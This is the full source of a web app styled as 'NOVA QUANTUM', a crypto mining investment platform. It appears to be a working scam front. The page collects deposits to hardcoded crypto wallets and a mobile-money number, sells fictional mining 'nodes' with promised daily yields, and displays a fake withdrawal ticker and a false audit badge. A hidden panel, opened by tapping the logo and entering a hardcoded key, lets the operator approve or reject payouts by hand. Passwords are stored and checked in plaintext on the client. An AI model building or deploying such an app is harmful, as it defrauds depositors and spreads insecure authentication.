<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA QUANTUM | Global Mining Infrastructure</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;800&family=Space+Grotesk:wght@700&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #000000; --card: rgba(255, 255, 255, 0.04); }
        body { background: var(--bg); color: #fff; font-family: 'Plus Jakarta Sans', sans-serif; letter-spacing: -0.02em; overflow-x: hidden; }
        .font-bold-tech { font-family: 'Space Grotesk', sans-serif; text-transform: uppercase; letter-spacing: 2px; }
        
        /* Premium UI Elements */
        .glass-panel { background: var(--card); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; }
        .gold-glow { box-shadow: 0 0 30px rgba(212, 175, 55, 0.15); border-color: rgba(212, 175, 55, 0.3); }
        .btn-premium { background: linear-gradient(90deg, #D4AF37, #FBE795); color: #000; font-weight: 800; border-radius: 16px; transition: 0.3s; font-size: 11px; text-transform: uppercase; }
        .btn-premium:active { transform: scale(0.95); opacity: 0.9; }

        /* Animations */
        @keyframes slide { from { transform: translateX(100%); } to { transform: translateX(-100%); } }
        .ticker-anim { animation: slide 25s linear infinite; white-space: nowrap; }
        
        .screen { display: none; padding-bottom: 120px; animation: screenFade 0.5s ease-out; }
        .active-screen { display: block; }
        @keyframes screenFade { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }

        .nav-bar { position: fixed; bottom: 20px; left: 20px; right: 20px; background: rgba(15,15,15,0.8); backdrop-filter: blur(30px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; display: flex; justify-content: space-around; padding: 18px; z-index: 1000; }
        .nav-item { color: #555; transition: 0.3s; font-size: 12px; }
        .nav-item.active { color: var(--gold); }
        
        .nova-input { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); width: 100%; padding: 18px; border-radius: 16px; color: #fff; font-size: 14px; margin-bottom: 15px; outline: none; }
        .nova-input:focus { border-color: var(--gold); }
    </style>
</head>
<body>

    <div class="bg-[#D4AF37]/10 py-2 overflow-hidden sticky top-0 z-[100] border-b border-[#D4AF37]/20">
        <div class="ticker-anim flex gap-12 items-center">
            <span class="text-[9px] font-black uppercase text-gray-400">BTC/USDT <span class="text-green-500">$94,201.44 (+2.4%)</span></span>
            <span class="text-[9px] font-black uppercase text-gray-400">ETH/USDT <span class="text-green-500">$3,412.10 (+1.8%)</span></span>
            <span class="text-[9px] font-black uppercase text-gray-400">NETWORK HASH <span class="text-white">455.21 EH/s</span></span>
            <span class="text-[9px] font-black uppercase text-gray-400">RECENT WITHDRAWAL <span class="text-white">User_8847: $1,240.00</span></span>
        </div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col p-10 justify-center active-screen">
        <h1 onclick="handleTaps()" class="font-bold-tech text-5xl mb-2 text-white">NOVA<span class="text-[#D4AF37]">.</span></h1>
        <p class="text-[10px] text-gray-500 font-bold tracking-[8px] uppercase mb-16">Quantum Mining Node</p>
        <div class="space-y-4">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input">
            <input type="password" id="u-pass" placeholder="System Passkey" class="nova-input">
            <input type="text" id="adm-key" placeholder="Admin Override" class="hidden nova-input border-[#D4AF37]">
            <button onclick="auth()" class="w-full btn-premium py-5 shadow-2xl">Initialize Access</button>
            <p onclick="toggleM()" id="m-text" class="text-center text-[10px] mt-10 text-gray-500 font-black uppercase cursor-pointer tracking-widest">Register New Identity</p>
        </div>
    </div>

    <div id="app" class="hidden px-6 pt-10">
        <div id="dash-screen" class="screen active-screen">
            <div class="flex justify-between items-center mb-10">
                <div>
                    <h2 id="user-display" class="text-[10px] font-black text-gray-500 uppercase tracking-widest">---</h2>
                    <p class="text-xs font-bold text-green-500 flex items-center gap-2">
                        <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span> SYSTEM ONLINE
                    </p>
                </div>
                <div class="w-12 h-12 glass-panel flex items-center justify-center text-[#D4AF37] font-black">N</div>
            </div>

            <div class="glass-panel p-10 mb-8 gold-glow relative overflow-hidden">
                <div class="absolute -top-10 -right-10 w-32 h-32 bg-[#D4AF37]/5 rounded-full blur-3xl"></div>
                <p class="text-[10px] text-gray-500 font-black tracking-[6px] uppercase mb-4 text-center">Active Capital Balance</p>
                <h1 id="main-bal" class="text-6xl font-black tracking-tighter text-center">$0.00</h1>
                <div class="mt-8 pt-8 border-t border-white/5 flex justify-between items-center">
                    <p id="v-daily" class="text-[10px] font-black text-green-500 uppercase tracking-widest">+$0.00 DAILY</p>
                    <span class="text-[10px] font-black text-gray-600 uppercase">TIER 1 NODE</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-10">
                <button onclick="openModal('dep-modal')" class="glass-panel p-6 flex flex-col items-center gap-3 active:scale-95 transition">
                    <i class="fa-solid fa-bolt text-[#D4AF37]"></i>
                    <span class="text-[10px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="openModal('wd-modal')" class="glass-panel p-6 flex flex-col items-center gap-3 active:scale-95 transition text-red-500">
                    <i class="fa-solid fa-arrow-up-right-from-square"></i>
                    <span class="text-[10px] font-black uppercase tracking-widest">Extract</span>
                </button>
            </div>

            <div class="glass-panel p-8 mb-8 bg-gradient-to-br from-white/[0.02] to-transparent">
                <h3 class="text-[10px] font-black mb-6 uppercase tracking-[4px] text-gray-400">Institutional Protocol</h3>
                <p class="text-[11px] text-gray-500 leading-relaxed font-medium mb-8">NOVA leverages ASIC clusters and Liquid Cooling technology to provide 99.9% uptime for institutional mining contracts.</p>
                <div class="grid grid-cols-3 gap-4">
                    <div class="text-center"><p class="text-[7px] text-gray-600 font-black mb-1">AUDIT</p><p class="text-[9px] font-bold text-blue-500">CertiK</p></div>
                    <div class="text-center"><p class="text-[7px] text-gray-600 font-black mb-1">ASSET</p><p class="text-[9px] font-bold">SHA-256</p></div>
                    <div class="text-center"><p class="text-[7px] text-gray-600 font-black mb-1">STATUS</p><p class="text-[9px] font-bold text-green-500">LEGAL</p></div>
                </div>
            </div>
        </div>

        <div id="mine-screen" class="screen">
            <h2 class="font-bold-tech text-3xl mb-10">HARDWARE<span class="text-[#D4AF37]">.</span></h2>
            <div id="nodes-container" class="space-y-6"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-terminal text-xl"></i></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-server text-xl"></i></div>
            <div onclick="openModal('dep-modal')" class="nav-item"><i class="fa-solid fa-wallet text-xl"></i></div>
        </nav>
    </div>

    <div id="dep-modal" class="modal bg-[#000]">
        <div onclick="closeModal('dep-modal')" class="mb-12 text-gray-500 font-black text-[10px] uppercase tracking-widest">Cancel Transaction</div>
        <h2 class="font-bold-tech text-4xl mb-10">FUND <span class="text-green-500">DEPOSIT</span></h2>
        <select id="dep-method" class="nova-input" onchange="updateAddr()">
            <option value="Trust">Trust Wallet (BEP20)</option>
            <option value="Binance">Binance (TRC20)</option>
            <option value="Meta">MetaMask (ERC20)</option>
            <option value="Local">JazzCash / EasyPaisa</option>
        </select>
        <div class="glass-panel p-6 mb-8 text-center border-dashed border-[#D4AF37]/30">
            <p id="dep-addr" class="text-[11px] font-mono break-all text-gray-400">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>
        <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="nova-input">
        <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="nova-input">
        <div class="glass-panel p-4 mb-10">
            <p class="text-[9px] font-black text-gray-600 mb-2 uppercase">Image Verification (Proof)</p>
            <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-gray-500">
        </div>
        <button onclick="requestFin('Deposit')" class="w-full btn-premium py-5">Finalize Transmission</button>
    </div>

    <div id="wd-modal" class="modal">
        <div onclick="closeModal('wd-modal')" class="mb-12 text-gray-500 font-black text-[10px] uppercase tracking-widest">Back</div>
        <h2 class="font-bold-tech text-4xl mb-10 text-red-500">ASSET EXTRACT</h2>
        <input type="number" id="wd-amt" placeholder="Withdrawal Amount ($)" class="nova-input">
        <input type="text" id="wd-acc" placeholder="Wallet Address / Number" class="nova-input">
        <button onclick="requestFin('Withdrawal')" class="w-full bg-white text-black font-black py-5 rounded-2xl uppercase text-[11px] tracking-widest">Authorize Extraction</button>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-8 overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-[#D4AF37] font-bold-tech text-xl">CONTROL HUB</h2>
            <button onclick="location.reload()" class="text-red-500 font-black text-xs">DISCONNECT</button>
        </div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let isLogin = true;

        const addrs = { "Trust": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "Meta": "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2", "Binance": "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37", "Local": "0300-XXXXXXX" };
        window.updateAddr = () => { document.getElementById('dep-addr').innerText = addrs[document.getElementById('dep-method').value]; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            const ak = document.getElementById('adm-key').value;
            if(ak === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("Credentials Missing");
            const uRef = doc(db, "users", id); const s = await getDoc(uRef);
            if(!isLogin) {
                if(s.exists()) return alert("Node Identity Taken");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0 });
                start(id);
            } else if(s.exists() && s.data().password === pw) {
                start(id);
            } else alert("Access Denied");
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-display').innerText = "NODE-ID: " + id;
            onSnapshot(doc(db, "users", id), d => {
                document.getElementById('main-bal').innerText = "$" + (d.data().balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (d.data().daily || 0).toFixed(2) + " DAILY";
            });
            renderNodes();
        }

        function renderNodes() {
            const c = document.getElementById('nodes-container'); c.innerHTML = "";
            const models = ["BITMAIN ANTMINER", "ICE RIVER QUANTUM", "AVALON NANO", "WHATS MINER", "NOVA CORE"];
            for(let i=1; i<=20; i++) {
                let p = i===1?15:(i*120); let y = (p*0.06).toFixed(2);
                c.innerHTML += `<div class="glass-panel p-8 relative overflow-hidden">
                    <div class="flex justify-between items-start mb-10">
                        <div><p class="text-[8px] font-black text-[#D4AF37] mb-1 uppercase tracking-widest">${models[i%5]}</p><h4 class="font-bold-tech text-lg">SERIES v.${i}</h4></div>
                        <span class="text-[8px] bg-green-500/10 text-green-500 px-3 py-1 rounded-full font-black">HASH-RATE: ${i*14} TH/s</span>
                    </div>
                    <div class="flex justify-between items-end border-t border-white/5 pt-6">
                        <div><p class="text-[8px] text-gray-600 font-black uppercase mb-1">Contract Price</p><p class="text-3xl font-black">$${p}</p></div>
                        <button onclick="buyNode(${p},${y})" class="btn-premium px-8 py-4 shadow-xl">Deploy</button>
                    </div>
                </div>`;
            }
        }

        window.requestFin = async (type) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            let payload = { user: activeUser, type, status: 'Pending', time: Date.now() };
            if(type === 'Deposit') {
                payload.amount = parseFloat(document.getElementById('dep-amt').value);
                payload.tid = document.getElementById('dep-tid').value;
                const file = document.getElementById('dep-proof').files[0];
                if(file) {
                    const reader = new FileReader();
                    reader.onloadend = async () => { payload.proof = reader.result; await addDoc(collection(db, "logs"), payload); alert("Packet Transmitted"); closeModal('dep-modal'); };
                    reader.readAsDataURL(file);
                } else { await addDoc(collection(db, "logs"), payload); alert("Transmitted"); closeModal('dep-modal'); }
            } else {
                payload.amount = parseFloat(document.getElementById('wd-amt').value);
                payload.acc = document.getElementById('wd-acc').value;
                if(s.data().balance < payload.amount) return alert("Liquidity Low");
                await updateDoc(uRef, { balance: s.data().balance - payload.amount });
                await addDoc(collection(db, "logs"), payload); alert("Extraction Authorized"); closeModal('wd-modal');
            }
        };

        window.buyNode = async (p, d) => {
            const uRef = doc(db, "users", activeUser); const s = await getDoc(uRef);
            if(s.data().balance < p) return alert("Insufficient Capital");
            await updateDoc(uRef, { balance: s.data().balance - p, daily: (s.data().daily || 0) + parseFloat(d) });
            alert("Hardware Online!");
        };

        function loadAdmin() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-list'); al.innerHTML = "";
                s.forEach(d => {
                    const r = d.data();
                    al.innerHTML += `<div class="glass-panel p-6 border-l-4 ${r.type=='Deposit'?'border-green-500':'border-red-500'} bg-white/5">
                        <div class="flex justify-between items-center mb-4"><span class="text-[9px] font-black uppercase text-gray-500">${r.type}</span><span class="text-xl font-black">$${r.amount}</span></div>
                        <p class="text-[8px] text-gray-400 mb-4">USER: ${r.user} | TID: ${r.tid || r.acc}</p>
                        ${r.proof ? `<button onclick="window.open('${r.proof}')" class="text-blue-500 text-[10px] underline mb-4 block uppercase font-bold">Inspect Proof</button>` : ''}
                        <div class="flex gap-2">
                            <button onclick="approve('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-green-600 py-3 rounded-xl text-[9px] font-black uppercase">Approve</button>
                            <button onclick="reject('${d.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 bg-red-600 py-3 rounded-xl text-[9px] font-black uppercase">Reject</button>
                        </div>
                    </div>`;
                });
            });
        }

        window.approve = async (id, u, a, t) => { if(t === 'Deposit') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Success' }); };
        window.reject = async (id, u, a, t) => { if(t === 'Withdrawal') { const uR = doc(db, "users", u); const us = await getDoc(uR); await updateDoc(uR, { balance: (us.data().balance || 0) + a }); } await updateDoc(doc(db, "logs", id), { status: 'Rejected' }); };
        window.handleTaps = () => { window.taps = (window.taps || 0) + 1; if(window.taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "Register New Identity" : "Back to Terminal"; };
        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('nav-' + id.split('-')[0]).classList.add('active');
        };
    </script>
</body>
</html>
